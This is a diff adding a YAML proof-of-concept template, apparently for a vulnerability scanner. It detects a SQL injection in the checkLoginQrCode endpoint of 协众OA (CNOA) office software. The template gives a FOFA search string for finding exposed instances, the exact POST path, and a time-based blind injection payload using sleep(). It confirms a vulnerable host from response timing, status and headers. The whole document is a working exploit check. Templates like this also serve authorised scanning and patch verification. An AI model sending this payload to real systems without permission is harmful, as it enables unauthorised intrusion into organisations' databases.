@@ -1,0 +1,29 @@
+id: poc-yaml-cnoa-checkloginqrcode-sqli
+info:
+  name: 协众OA checkLoginQrCode SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 协众OA
+  fofa: app="协众软件-协众OA"
+variables:
+  t1: random_int(4,9)
+  t2: t1 + 2
+requests:
+- method: POST
+  path: /index.php?app=main&func=common&action=commonJob&act=checkLoginQrCode
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: id=(select * from (select sleep({{.t1}}))z)
+  expression: 'status_code == 200 &&
+
+    contains(body,`{"failure":true,"msg":1}`) &&
+
+    contains(headers,"CNOA") &&
+
+    duration > t1 &&
+
+    duration < t2
+
+    '
+transport: http
